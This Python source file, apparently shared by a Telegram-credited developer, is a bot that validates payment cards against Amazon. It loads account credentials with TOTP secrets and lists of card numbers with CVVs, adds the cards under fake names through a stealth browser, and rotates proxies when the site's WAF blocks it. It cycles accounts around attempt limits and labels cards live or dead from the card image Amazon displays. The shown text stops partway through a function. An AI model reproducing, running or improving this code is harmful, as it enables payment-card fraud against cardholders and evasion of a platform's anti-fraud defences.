#Dev: @juldeptrai (telegram)


import asyncio
import math
import requests
import json
import aiohttp
import logging
import traceback
from datetime import datetime, timedelta
from stealth_browser import StealthBrowser
import os
from faker import Faker
from urllib.parse import urlparse

fake = Faker()

# Global locks (initialized lazily)
cards_lock = None

# Configuration for image-based live/die checking
IMAGE_LIVE_CHECK_ENABLED = os.getenv('IMAGE_LIVE_CHECK_ENABLED', 'true').lower() == 'true'
DEFAULT_AMAZON_CARD_IMAGE_IDS = os.getenv('DEFAULT_AMAZON_CARD_IMAGE_IDS', '41mgianmk5l,81nbffbyidl,61qmvy8jr9l,6152az+0gfl').lower().split(',')

# Create result and log directories if not exists
os.makedirs('result', exist_ok=True)
os.makedirs('log', exist_ok=True)

# Setup logging
def setup_logging():
    """Setup logging to file"""
    log_filename = f"log/amazon_bot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_filename, encoding='utf-8'),
            logging.StreamHandler()  # Also print to console
        ]
    )
    
    return logging.getLogger(__name__)

logger = setup_logging()

def get_user_settings():
    """Get user settings for headless mode and thread count"""
    print("=" * 50)
    print("AMAZON BOT CONFIGURATION")
    print("=" * 50)
    
    # Headless mode
    while True:
        headless_input = input("Run in headless mode? (y/n): ").lower().strip()
        if headless_input in ['y', 'yes', '1']:
            headless = True
            print("Headless mode: ON")
            break
        elif headless_input in ['n', 'no', '0']:
            headless = False
            print("Headless mode: OFF")
            break
        else:
            print("Please enter 'y' for yes or 'n' for no")
    
    # Thread count
    while True:
        try:
            thread_input = input("Number of threads (default: all accounts): ").strip()
            if not thread_input:
                thread_count = None
                print("Thread count: All accounts")
                break
            else:
                thread_count = int(thread_input)
                if thread_count > 0:
                    print(f"Thread count: {thread_count}")
                    break
                else:
                    print("Please enter a positive number")
        except ValueError:
            print("Please enter a valid number")
    
    print("=" * 50)
    return headless, thread_count

def normalize_image_src(src):
    """Normalize image URL to handle different sizes and compare base image ID"""
    if not src:
        return ''
    
    try:
        import re
        from urllib.parse import urlparse
        
        # Parse URL to get the path
        parsed_url = urlparse(src)
        path = parsed_url.path
        
        # Get filename from path
        filename = path.split('/')[-1].lower()
        
        # Extract base ID from filename (remove size tokens like _SL85_, _SL196_)
        # Example: 81NBfFByidL._SL85_.png -> 81NBfFByidL
        # Example: 61KLBN-l7AL._SL196_.png -> 61klbn-l7al
        match = re.match(r'^([a-z0-9-]+)', filename)
        if match:
            return match.group(1)
        
        return ''
    except Exception as e:
        logger.warning(f"[System] Error normalizing image src {src}: {e}")
        return ''

def is_default_amazon_card_image(src):
    """Check if image is default Amazon card image (DIE) or custom bank image (LIVE)"""
    if not IMAGE_LIVE_CHECK_ENABLED:
        # Feature disabled - treat all as DIE for safety
        logger.info(f"[System] Image live check disabled via config - treating as DIE")
        return True
    
    # Use configurable default image IDs
    default_image_ids = set(DEFAULT_AMAZON_CARD_IMAGE_IDS)
    
    normalized_id = normalize_image_src(src)
    return normalized_id in default_image_ids


def read_accounts_from_file(file_path: str):
    """Read accounts from email.txt file"""
    accounts = []
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
            
        for line in lines:
            line = line.strip()
            if line and not line.startswith('ORDER:'):
                parts = line.split('|')
                if len(parts) >= 3:
                    accounts.append({
                        'email': parts[0],
                        'password': parts[1],
                        'totp_secret': parts[2]
                    })
    except FileNotFoundError:
        print("File list/email.txt not found!")
    
    return accounts

def read_credit_cards_from_file(file_path: str):
    """Read credit cards from cc.txt file"""
    cards = []
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()

        for line in lines:
            line = line.strip()
            if line:
                parts = line.split('|')
                if len(parts) >= 3:
                    card_data = {
                        'number': parts[0],
                        'month': parts[1],
                        'year': parts[2]
                    }
                    # Add CVV if available (4th part)
                    if len(parts) >= 4:
                        card_data['cvv'] = parts[3]
                    cards.append(card_data)
    except FileNotFoundError:
        print("File list/cc.txt not found!")
    
    return cards

def assign_cards_to_accounts(accounts, cards, cards_per_account=5):
    """Assign 5 credit cards to each account"""
    for i, account in enumerate(accounts):
        start_index = i * cards_per_account
        end_index = start_index + cards_per_account
        account['credit_cards'] = cards[start_index:end_index]
        print(f"{account['email']} assigned {len(account['credit_cards'])} cards")
    
    return accounts

def get_2fa_token(totp_secret: str):
    """Get 2FA token from API"""
    try:
        url = f"https://2fa.live/tok/{totp_secret}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get('token')
    except Exception as e:
        print(f"Error getting 2FA token: {e}")
    return None

def get_screen_size():
    """Auto-detect screen size from OS"""
    try:
        # Windows: use ctypes to get screen resolution
        import ctypes
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()  # Handle high DPI screens
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        return screen_width, screen_height
    except Exception:
        pass
    
    try:
        # Fallback: try screeninfo library
        from screeninfo import get_monitors
        monitor = get_monitors()[0]
        return monitor.width, monitor.height
    except Exception:
        pass
    
    # Default fallback
    return 1920, 1080

def calculate_window_positions(num_browsers: int, screen_width: int = None, screen_height: int = None):
    """Automatically calculate window positions based on number of browsers and screen size
    Layout: Fill rows horizontally first, then move to next row when full
    """
    # Auto-detect screen size if not provided
    if screen_width is None or screen_height is None:
        screen_width, screen_height = get_screen_size()
        print(f"[Main] Detected screen size: {screen_width}x{screen_height}")
    
    # Fixed window size (portrait: 320x480)
    window_width = 320
    window_height = 480
    
    # Calculate how many windows fit per row
    cols_per_row = screen_width // window_width
    if cols_per_row < 1:
        cols_per_row = 1
    
    positions = []
    for i in range(num_browsers):
        row = i // cols_per_row  # Which row (0, 1, 2, ...)
        col = i % cols_per_row   # Which column in row
        
        x = window_width * col
        y = window_height * row
        
        positions.append({
            'x': x,
            'y': y, 
            'width': window_width,
            'height': window_height
        })
    
    return positions

def read_proxies_from_file(file_path: str):
    """Read proxies from proxies.txt file"""
    proxies = []
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
            
        for line in lines:
            line = line.strip()
            if line:
                # Check proxy type
                if '@' in line:
                    # Type 2: user:pass@ip:port
                    auth_part, server_part = line.split('@', 1)
                    username, password = auth_part.split(':', 1)
                    # Handle IPv6 addresses by splitting from the right
                    ip, port = server_part.rsplit(':', 1)
                    proxies.append({
                        'type': 2,
                        'server': f"http://{ip}:{port}",
                        'username': username,
                        'password': password
                    })
                else:
                    # Type 1: ip:port
                    # Handle IPv6 addresses by splitting from the right
                    ip, port = line.rsplit(':', 1)
                    proxies.append({
                        'type': 1,
                        'server': f"http://{ip}:{port}"
                    })
    except FileNotFoundError:
        print("File list/proxies.txt not found!")
    
    return proxies

def write_proxies_to_file(file_path: str, proxies):
    """Overwrite proxies.txt with provided proxies in original formats."""
    try:
        lines = []
        for p in proxies:
            server = p.get('server', '')
            ip_port = server.replace('http://', '')
            if p.get('type') == 2 and p.get('username') and p.get('password'):
                line = f"{p['username']}:{p['password']}@{ip_port}"
            else:
                line = ip_port
            lines.append(line)
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines) + ('\n' if lines else ''))
    except Exception as e:
        print(f"[Main] Failed to write live proxies to {file_path}: {e}")

def remove_proxy_from_file(file_path: str, proxy_config: dict):
    """Remove a specific proxy entry from proxies.txt if it exists."""
    try:
        # Build the line representation to remove
        server = proxy_config.get('server', '')
        ip_port = server.replace('http://', '')
        if proxy_config.get('type') == 2 and proxy_config.get('username') and proxy_config.get('password'):
            target_line = f"{proxy_config['username']}:{proxy_config['password']}@{ip_port}"
        else:
            target_line = ip_port

        # Read existing lines
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = [ln.rstrip('\n') for ln in f.readlines()]
        except FileNotFoundError:
            return False

        # Filter out the target line (remove all occurrences)
        new_lines = [ln for ln in lines if ln.strip() and ln.strip() != target_line]

        if len(new_lines) != len(lines):
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(new_lines) + ('\n' if new_lines else ''))
            return True
        return False
    except Exception as e:
        print(f"[Main] Failed to remove proxy from {file_path}: {e}")
        return False

def assign_proxies_to_accounts(accounts, proxies):
    """Assign proxies to accounts evenly (round-robin per account).

    - If there are no proxies, every account gets no proxy assigned.
    - If there are fewer proxies than accounts, reuse proxies by cycling with modulo.
    - Preserve existing log format for assigned and no-proxy cases.
    """
    n = len(proxies)
    for i, account in enumerate(accounts):
        if n == 0:
            account['proxy'] = None
            print(f"{account['email']} no proxy assigned")
        else:
            # Round-robin assignment
            proxy = proxies[i % n]
            account['proxy'] = proxy

            # Build proxy info string consistent with existing format
            proxy_info = f"{proxy['server']}"
            if proxy.get('type') == 2 and proxy.get('username'):
                proxy_info += f" (auth: {proxy['username']})"
            print(f"{account['email']} assigned proxy: {proxy_info}")

    return accounts

async def check_proxy_status(proxy_config):
    """Check if proxy is working and get IP"""
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        
        if proxy_config.get('username'):
            # Type 2: with auth
            proxy_url = f"http://{proxy_config['username']}:{proxy_config['password']}@{proxy_config['server'].replace('http://', '')}"
        else:
            # Type 1: no auth
            proxy_url = proxy_config['server']
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://httpbin.org/ip', proxy=proxy_url) as response:
                if response.status == 200:
                    data = await response.json()
                    return True, data.get('origin', 'Unknown IP')
                else:
                    return False, f"HTTP {response.status}"
                    
    except Exception as e:
        return False, str(e)

async def filter_live_proxies(proxies, concurrency_limit: int = 20):
    """Filter and return only live proxies (preserve order).

    - Uses check_proxy_status to validate each proxy concurrently with a cap.
    - Any exception or non-200 is treated as dead.
    - Returns a list of proxy dicts that are live.
    - Prints a summary line: "[Main] Live proxies: X/Y".
    """
    if not proxies:
        print("[Main] Live proxies: 0/0")
        return []

    semaphore = asyncio.Semaphore(concurrency_limit)

    async def probe(idx, p):
        async with semaphore:
            try:
                ok, _ = await check_proxy_status(p)
                return (idx, p) if ok else None
            except Exception:
                return None

    tasks = [probe(i, p) for i, p in enumerate(proxies)]
    results = await asyncio.gather(*tasks, return_exceptions=False)

    live_indexed = [r for r in results if r is not None]
    # Preserve original order by index
    live_indexed.sort(key=lambda x: x[0])
    live = [p for _, p in live_indexed]

    print(f"[Main] Live proxies: {len(live)}/{len(proxies)}")
    return live

def _get_port_from_proxy(proxy_config) -> str | None:
    """Extract port string from proxy config's server URL (e.g., http://host:12345)."""
    try:
        server = proxy_config.get('server') if isinstance(proxy_config, dict) else str(proxy_config)
        if not server:
            return None
        parsed = urlparse(server)
        if parsed.port:
            return str(parsed.port)
        # Fallback: split host:port from netloc if urlparse failed to set port
        netloc = parsed.netloc or server.replace('http://','').replace('https://','')
        if ':' in netloc:
            return netloc.rsplit(':', 1)[1]
        return None
    except Exception:
        return None

async def _rotate_local_proxy_port(port: str, country: str = 'US') -> bool:
    """Call local proxy manager to free and reassign a new IP on the same port."""
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            free_url = f"http://127.0.0.1:10101/api/port_free?t=2&ports={port}"
            assign_url = f"http://127.0.0.1:10101/api/proxy?t=2&num=1&port={port}&country={country}"
            try:
                async with session.get(free_url) as resp:
                    _ = await resp.text()
            except Exception:
                pass  # best-effort free
            async with session.get(assign_url) as resp:
                return 200 <= resp.status < 300
    except Exception:
        return False

async def handle_waf_rotate_proxy(instance_id: int, proxy_config: dict, country: str = 'US') -> bool:
    """On WAF: free current proxy port and assign a new one, then return True if changed."""
    try:
        if not proxy_config:
            logger.warning(f"[Thread: {instance_id}] WAF detected but no proxy assigned")
            return False
        port = _get_port_from_proxy(proxy_config)
        if not port:
            logger.warning(f"[Thread: {instance_id}] WAF detected but cannot extract proxy port from {proxy_config}")
            return False
        logger.info(f"[Thread: {instance_id}] WAF detected - rotating proxy on port {port} ...")
        ok = await _rotate_local_proxy_port(port, country=country)
        if ok:
            logger.info(f"[Thread: {instance_id}] Proxy rotated on port {port} (country={country})")
        else:
            logger.warning(f"[Thread: {instance_id}] Failed to rotate proxy on port {port}")
        return ok
    except Exception as e:
        logger.warning(f"[Thread: {instance_id}] Error rotating proxy on WAF: {e}")
        return False

class RoundRobinProxyPool:
    """Async round-robin proxy pool safe for concurrent workers."""
    def __init__(self, proxies):
        self._proxies = list(proxies)  # preserve order
        self._idx = 0
        self._lock = asyncio.Lock()

    async def next(self):
        async with self._lock:
            if not self._proxies:
                return None
            p = self._proxies[self._idx % len(self._proxies)]
            self._idx = (self._idx + 1) % len(self._proxies)
            return p

    async def remove(self, proxy):
        async with self._lock:
            if not self._proxies:
                return False
            target_server = proxy.get('server')
            target_user = proxy.get('username')
            target_pass = proxy.get('password')
            for i, p in enumerate(self._proxies):
                if p.get('server') == target_server and p.get('username') == target_user and p.get('password') == target_pass:
                    self._proxies.pop(i)
                    if self._proxies:
                        if self._idx > i:
                            self._idx -= 1
                        self._idx %= len(self._proxies)
                    else:
                        self._idx = 0
                    return True
            return False

    async def size(self):
        async with self._lock:
            return len(self._proxies)

async def select_dropdown_option(iframe, selector: str, value_candidates=None, label_candidates=None, wait_options_timeout: int = 5000) -> bool:
    """Robustly select an option in a native <select> by trying multiple candidates.

    - Waits for the select to be visible.
    - Waits (best-effort) for options to be present.
    - Tries value candidates first, then label candidates.
    - Falls back to JS selection by matching label/text when necessary.
    - Returns True if selection likely succeeded, False otherwise.
    """
    value_candidates = value_candidates or []
    label_candidates = label_candidates or []

    select = iframe.locator(selector)

    # Ensure the select is visible
    try:
        await select.wait_for(state='visible', timeout=15000)
    except Exception as e:
        logger.error(f"[System] Select not visible for '{selector}': {e}")
        return False

    # Best-effort: wait for options to exist
    try:
        await iframe.locator(f"{selector} option").first.wait_for(timeout=wait_options_timeout)
    except:
        # Continue anyway; some pages render options late but select_option may still work
        pass

    # Try by value
    for v in value_candidates:
        try:
            if v is None:
                continue
            res = await select.select_option(value=str(v))
            if res:
                return True
        except:
            continue

    # Try by label
    for l in label_candidates:
        try:
            if l is None:
                continue
            res = await select.select_option(label=str(l))
            if res:
                return True
        except:
            continue

    # Fallback: pick by searching visible text/label and set via JS
    try:
        matched = await select.evaluate(
            """
            (el, labels) => {
              const opts = Array.from(el.options);
              for (const cand of labels) {
                const norm = String(cand).trim();
                let opt = opts.find(o => (o.label && o.label.trim() === norm) || (o.textContent && o.textContent.trim() === norm));
                if (!opt) opt = opts.find(o => (o.label && o.label.includes(norm)) || (o.textContent && o.textContent.includes(norm)));
                if (opt) {
                  el.value = opt.value;
                  el.dispatchEvent(new Event('input', { bubbles: true }));
                  el.dispatchEvent(new Event('change', { bubbles: true }));
                  return true;
                }
              }
              return false;
            }
            """,
            label_candidates
        )
        if matched:
            return True
    except Exception as e:
        logger.warning(f"[System] JS fallback select failed for '{selector}': {e}")

    return False

async def click_add_your_card(iframe) -> bool:
    """Robustly click the 'Add your card' button inside the payment iframe."""
    selectors = [
        'input[name="ppw-widgetEvent:AddCreditCardEvent"]',
        'span.a-button-text:has-text("Add your card")',
        'span[id$="-announce"]:has-text("Add your card")',
    ]

    for sel in selectors:
        try:
            loc = iframe.locator(sel).first
            if await loc.count() == 0:
                continue
            try:
                await loc.scroll_into_view_if_needed()
            except:
                pass
            try:
                await loc.wait_for(state='visible', timeout=3000)
            except:
                pass
            try:
                await loc.click()
                return True
            except:
                try:
                    await loc.click(force=True)
                    return True
                except:
                    continue
        except:
            continue

    # Last resort: JS click on the input element
    try:
        await iframe.locator('input[name="ppw-widgetEvent:AddCreditCardEvent"]').first.evaluate("el => el.click()")
        return True
    except Exception as e:
        logger.error(f"[System] Failed to click 'Add your card': {e}")
        return False

async def get_current_ip():
    """Get current IP without proxy"""
    try:
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://httpbin.org/ip') as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get('origin', 'Unknown IP')
    except:
        return 'Unable to detect'

def save_limited_email(account: dict):
    """Save limited email to file with account details and unlock time"""
    try:
        current_time = datetime.now()
        unlock_time = current_time + timedelta(hours=2)
        
        timestamp = current_time.strftime('%Y-%m-%d %H:%M:%S')
        unlock_timestamp = unlock_time.strftime('%Y-%m-%d %H:%M:%S')
        
        with open('limited_emails.txt', 'a', encoding='utf-8') as file:
            file.write(f"{account['email']}|{account['password']}|{account['totp_secret']}|{timestamp}|{unlock_timestamp}\n")
        logger.info(f"[System] Saved limited email: {account['email']} - Unlocks at {unlock_timestamp}")
    except Exception as e:
        logger.error(f"[System] Failed to save limited email: {e}")

def upsert_result_email(email: str, password: str, totp: str, timestamp: str, unlock_timestamp: str):
    """Replace any existing result/email.txt line for email with a new line containing updated timestamps."""
    try:
        lines = []
        try:
            with open('result/email.txt', 'r', encoding='utf-8') as f:
                lines = [ln.rstrip('\n') for ln in f.readlines()]
        except FileNotFoundError:
            lines = []
        # Filter out old entries for the same email
        filtered = []
        for ln in lines:
            parts = ln.split('|')
            if len(parts) >= 1 and parts[0] == email:
                continue
            filtered.append(ln)
        # Append updated line with timestamps
        filtered.append(f"{email}|{password}|{totp}|{timestamp}|{unlock_timestamp}")
        with open('result/email.txt', 'w', encoding='utf-8') as f:
            f.write('\n'.join(filtered) + ('\n' if filtered else ''))
    except Exception as e:
        logger.error(f"[System] Failed to upsert result/email.txt for {email}: {e}")

def remove_account_from_email_file(account_email):
    """Remove account from email.txt file"""
    try:
        # Read current accounts
        with open('list/email.txt', 'r', encoding='utf-8') as file:
            lines = file.readlines()
        
        # Filter out the account to remove
        remaining_lines = []
        removed = False
        for line in lines:
            line_stripped = line.strip()
            if line_stripped and not line_stripped.startswith('ORDER:'):
                parts = line_stripped.split('|')
                if len(parts) >= 3 and parts[0] == account_email:
                    removed = True
                    logger.info(f"[System] Removed {account_email} from email.txt")
                    continue
            remaining_lines.append(line)
        
        # Write back to file if account was found and removed
        if removed:
            with open('list/email.txt', 'w', encoding='utf-8') as file:
                file.writelines(remaining_lines)
            return True
        else:
            logger.warning(f"[System] Account {account_email} not found in email.txt")
            return False
            
    except Exception as e:
        logger.error(f"[System] Error removing account from email.txt: {e}")
        return False

def add_account_to_email_file(email: str, password: str, totp: str) -> bool:
    """Append account to list/email.txt if not already present."""
    try:
        existing = set()
        try:
            with open('list/email.txt', 'r', encoding='utf-8') as f:
                for ln in f:
                    ln = ln.strip()
                    if ln and not ln.startswith('ORDER:'):
                        parts = ln.split('|')
                        if len(parts) >= 3:
                            existing.add(parts[0])
        except FileNotFoundError:
            pass
        if email not in existing:
            with open('list/email.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}|{password}|{totp}\n")
            logger.info(f"[System] Re-added {email} to list/email.txt")
            return True
        return False
    except Exception as e:
        logger.error(f"[System] Error adding account to email.txt: {e}")
        return False

def remove_used_cards_from_file(used_cards):
    """Remove used cards from cc.txt file"""
    try:
        # Read current cards
        with open('list/cc.txt', 'r', encoding='utf-8') as file:
            lines = file.readlines()
        
        # Create set of used card numbers for faster lookup
        used_card_numbers = {card['number'] for card in used_cards}
        
        # Filter out used cards
        remaining_lines = []
        removed_count = 0
        for line in lines:
            line_stripped = line.strip()
            if line_stripped:
                parts = line_stripped.split('|')
                if len(parts) >= 3:
                    card_number = parts[0]
                    if card_number not in used_card_numbers:
                        remaining_lines.append(line)
                    else:
                        removed_count += 1
                        logger.info(f"[System] Removed used card from cc.txt: {card_number}")
                else:
                    remaining_lines.append(line)
            else:
                remaining_lines.append(line)
        
        # Write back to file
        with open('list/cc.txt', 'w', encoding='utf-8') as file:
            file.writelines(remaining_lines)
        
        logger.info(f"[System] Removed {removed_count} used cards from cc.txt")
        return True
        
    except Exception as e:
        logger.error(f"[System] Error removing used cards from cc.txt: {e}")
        return False

async def add_cards_to_account(browser, instance_id, account, iframe):
    """Add all 5 cards to the account"""
    added_cards = []  # Track successfully added cards
    
    # Add remaining 4 cards
    for card_index in range(1, 5):
        logger.info(f"[Thread: {instance_id}] Adding card {card_index + 1}/5")
        
        # Click "Add a credit or debit card" again
        await browser.human_click('a:has-text("Add a credit or debit card")')
        await asyncio.sleep(2)
        
        # Switch to iframe - use more flexible selector
        try:
            # Wait for iframe to load
            await asyncio.sleep(2)
            
            # Try multiple iframe selectors
            iframe = None
            iframe_selectors = [
                'iframe.apx-inline-secure-iframe',
                'iframe.pmts-portal-component',
                'iframe[name*="ApxSecureIframe"]',
                'iframe[id*="pp-"]'
            ]
            
            for selector in iframe_selectors:
                if await browser.page.locator(selector).count() > 0:
                    iframe = browser.page.frame_locator(selector)
                    logger.info(f"[Thread: {instance_id}] Found iframe with selector: {selector}")
                    break
            
            if not iframe:
                logger.error(f"[Thread: {instance_id}] No iframe found")
                continue
                
        except Exception as e:
            logger.error(f"[Thread: {instance_id}] Error finding iframe: {e}")
            continue
        
        # Input fake name
        fake_name = fake.name()
        await iframe.locator('input[name="ppw-accountHolderName"]').fill(fake_name)
        await asyncio.sleep(1)
        
        # Input credit card number - use more flexible selector
        try:
            card_number_selectors = [
                'input[name="addCreditCardNumber"]',
                'input.pmts-account-Number',
                'input[id*="pp-"][autocomplete="off"]',
                'input[type="tel"][name="addCreditCardNumber"]'
            ]
            
            card_input_found = False
            for selector in card_number_selectors:
                if await iframe.locator(selector).count() > 0:
                    await iframe.locator(selector).fill(account['credit_cards'][card_index]['number'])
                    logger.info(f"[Thread: {instance_id}] Card number input found with: {selector}")
                    card_input_found = True
                    break
            
            if not card_input_found:
                logger.error(f"[Thread: {instance_id}] Card number input not found")
                continue
                
        except Exception as e:
            logger.error(f"[Thread: {instance_id}] Error inputting card number: {e}")
            logger.error(f"[Thread: {instance_id}] Full traceback: {traceback.format_exc()}")
            continue
        
        # Select month from dropdown (robust)
        month_raw = str(account['credit_cards'][card_index]['month']).strip()
        month_val_candidates = []
        try:
            month_val_candidates.append(str(int(month_raw)))  # '01' -> '1'
        except:
            month_val_candidates.append(month_raw)
        if month_raw:
            m2 = month_raw.zfill(2)
            if m2 not in month_val_candidates:
                month_val_candidates.append(m2)
        await select_dropdown_option(
            iframe,
            'select[name="ppw-expirationDate_month"]',
            value_candidates=month_val_candidates,
            label_candidates=month_val_candidates
        )
        await asyncio.sleep(1)
        
        # Select year from dropdown (robust for 2-digit/4-digit)
        year_raw = str(account['credit_cards'][card_index]['year']).strip()
        if len(year_raw) == 2:
            y4 = '20' + year_raw
        else:
            y4 = year_raw
        y2 = y4[-2:] if y4 else ''
        year_val_candidates = [y4]
        if y2 and y2 not in year_val_candidates:
            year_val_candidates.append(y2)
        year_label_candidates = year_val_candidates[:]
        await select_dropdown_option(
            iframe,
            'select[name="ppw-expirationDate_year"]',
            value_candidates=year_val_candidates,
            label_candidates=year_label_candidates
        )
        await asyncio.sleep(1)

        # Input CVV if available
        if 'cvv' in account['credit_cards'][card_index]:
            try:
                cvv_selectors = [
                    'input[name="addCreditCardVerificationNumber"]',
                    'input[type="password"][maxlength="4"]',
                    'input.a-input-text.a-form-normal.a-width-small[type="password"]'
                ]

                cvv_input_found = False
                for selector in cvv_selectors:
                    if await iframe.locator(selector).count() > 0:
                        await iframe.locator(selector).fill(account['credit_cards'][card_index]['cvv'])
                        logger.info(f"[Thread: {instance_id}] CVV input found with: {selector}")
                        cvv_input_found = True
                        break

                if not cvv_input_found:
                    logger.warning(f"[Thread: {instance_id}] CVV input not found, continuing without CVV")
                else:
                    await asyncio.sleep(1)

            except Exception as e:
                logger.error(f"[Thread: {instance_id}] Error inputting CVV: {e}")
                logger.error(f"[Thread: {instance_id}] Full traceback: {traceback.format_exc()}")

        # Click "Add your card" button (robust)
        await click_add_your_card(iframe)
        await asyncio.sleep(3)
        
        # Check for exceeded maximum attempts error - multiple selectors
        limit_error_found = False
        if (await iframe.locator('div.a-alert-content:has-text("You have exceeded the maximum attempts allowed, please retry after 2 hours")').count() > 0 or
            await iframe.locator('div.a-alert-content:has-text("please retry after")').count() > 0 or
            await iframe.locator('div.a-alert-content:has-text("exceeded the maximum attempts")').count() > 0 or
            await iframe.locator('.a-alert-container .a-alert-content:has-text("You have exceeded")').count() > 0):
            limit_error_found = True
        
        if limit_error_found:
            logger.error(f"[Thread: {instance_id}] Email limit exceeded after card {card_index + 1} - going to check wallet")
            # Remove account from email.txt
            remove_account_from_email_file(account['email'])
            save_limited_email(account)
            # Go to check wallet with only successfully added cards
            await check_wallet_and_cleanup(browser, instance_id, account, added_cards)
            return "limit_reached"

        # Click "Use this address" button
        await iframe.locator('input[name="ppw-widgetEvent:SelectAddressEvent"]').click()
        await asyncio.sleep(3)
        
        # Check for exceeded maximum attempts error after "Use this address" - multiple selectors
        limit_error_found = False
        if (await iframe.locator('div.a-alert-content:has-text("You have exceeded the maximum attempts allowed, please retry after 2 hours")').count() > 0 or
            await iframe.locator('div.a-alert-content:has-text("please retry after")').count() > 0 or
            await iframe.locator('div.a-alert-content:has-text("exceeded the maximum attempts")').count() > 0 or
            await iframe.locator('.a-alert-container .a-alert-content:has-text("You have exceeded")').count() > 0):
            limit_error_found = True
        
        if limit_error_found:
            logger.error(f"[Thread: {instance_id}] Email limit exceeded after card {card_index + 1} - going to check wallet")
            # Remove account from email.txt
            remove_account_from_email_file(account['email'])
            save_limited_email(account)
            # Go to check wallet with only successfully added cards
            await check_wallet_and_cleanup(browser, instance_id, account, added_cards)
            return "limit_reached"
        
        # Card added successfully, add to tracking list
        added_cards.append(account['credit_cards'][card_index])
        logger.info(f"[Thread: {instance_id}] Card {card_index + 1}/5 added successfully")
    
    return added_cards  # Return list of successfully added cards

async def remove_all_cards_from_wallet_with_count(browser, instance_id, expected_cards):
    """Remove ALL cards from wallet with proper counting"""
    try:
        logger.info(f"[Thread: {instance_id}] Removing ALL cards from wallet (expecting {expected_cards} test cards)...")
        
        cards_removed = 0
        max_attempts = 15  # Increase max attempts
        
        for attempt in range(max_attempts):
            # Get all cards in wallet
            card_elements = await browser.page.locator('div.apx-wallet-selectable-payment-method-tab a[role="button"]').all()
            
            if not card_elements:
                logger.info(f"[Thread: {instance_id}] No cards found in wallet")
                break
            
            # Filter out Amazon Gift Cards
            valid_cards = []
            for card_element in card_elements:
                card_text = await card_element.text_content()
                if "Amazon Gift Card" not in card_text:
                    valid_cards.append(card_element)
            
            if not valid_cards:
                logger.info(f"[Thread: {instance_id}] Only Amazon Gift Cards remaining, stopping removal...")
                break
            
            logger.info(f"[Thread: {instance_id}] Attempt {attempt + 1}: Found {len(valid_cards)} valid cards in wallet (removed so far: {cards_removed})")
            
            # Remove first valid card
            try:
                card_element = valid_cards[0]
                card_text = await card_element.text_content()
                logger.info(f"[Thread: {instance_id}] Removing card: {card_text}")
                
                # Click on card to select
                await card_element.click()
                await asyncio.sleep(2)
                
                # Click Edit button
                edit_button = browser.page.locator('a[aria-label="edit payment method"]:has-text("Edit")').first
                if await edit_button.count() > 0:
                    logger.info(f"[Thread: {instance_id}] Click Edit button...")
                    await edit_button.click()
                    await asyncio.sleep(2)
                else:
                    logger.warning(f"[Thread: {instance_id}] Edit button not found")
                    continue
                
                # Click "Remove from wallet"
                if await browser.page.locator('input.apx-remove-link-button[value="Remove from wallet"]').count() > 0:
                    logger.info(f"[Thread: {instance_id}] Click Remove from wallet...")
                    await browser.page.locator('input.apx-remove-link-button[value="Remove from wallet"]').click()
                    await asyncio.sleep(2)
                    
                    # Confirm remove - thử các cách click khác nhau
                    if await browser.page.locator('span.a-button-text:has-text("Remove and update")').count() > 0:
                        logger.info(f"[Thread: {instance_id}] Click Remove and update...")
                        try:
                            await browser.page.locator('span.a-button-text:has-text("Remove and update")').first.click(force=True)
                            await asyncio.sleep(2)
                        except:
                            # Fallback: JavaScript click
                            await browser.page.evaluate('document.querySelector("span.a-button-text[aria-hidden=\'true\']").click()')
                            await asyncio.sleep(2)
                    elif await browser.page.locator('span.a-button-text:has-text("Remove")').count() > 0:
                        logger.info(f"[Thread: {instance_id}] Click Remove...")
                        try:
                            await browser.page.locator('span.a-button-text:has-text("Remove")').first.click(force=True)
                            await asyncio.sleep(2)
                        except:
                            # Fallback: JavaScript click
                            await browser.page.evaluate('document.querySelector("span.a-button-text[aria-hidden=\'true\']").click()')
                            await asyncio.sleep(2)
                    else:
                        logger.warning(f"[Thread: {instance_id}] Remove button not found, skip...")
                        continue
                    
                    # Kiểm tra thông báo remove thành công
                    await asyncio.sleep(2)
                    if await browser.page.locator('span.a-color-success:has-text("Your payment method has been removed successfully")').count() > 0:
                        cards_removed += 1
                        logger.info(f"[Thread: {instance_id}] ✅ Card removed successfully ({cards_removed}/{expected_cards})")
                    else:
                        cards_removed += 1
                        logger.info(f"[Thread: {instance_id}] Card removed ({cards_removed}/{expected_cards})")
                    
                    # Reload page to get updated card list
                    await browser.page.reload()
                    await asyncio.sleep(3)
                else:
                    logger.warning(f"[Thread: {instance_id}] Remove button not found")
                    break
                    
            except Exception as e:
                logger.error(f"[Thread: {instance_id}] Error removing card: {e}")
                # Try to reload and continue with next attempt
                try:
                    await browser.page.reload()
                    await asyncio.sleep(3)
                except:
                    pass
                continue
        
        logger.info(f"[Thread: {instance_id}] Finished removing cards - Total removed: {cards_removed}/{expected_cards}")
        
    except Exception as e:
        logger.error(f"[Thread: {instance_id}] Error in remove_all_cards_from_wallet_with_count: {e}")

async def check_wallet_and_cleanup(browser, instance_id, account, added_cards=None):
    """Check wallet for bank cards and remove added cards"""
    
    # If added_cards is None, use all cards (for backward compatibility)
    if added_cards is None:
        cards_to_process = account.get('credit_cards', [])
        logger.info(f"[Thread: {instance_id}] Processing all {len(cards_to_process)} assigned cards")
    else:
        # Include first card (always added) + successfully added cards
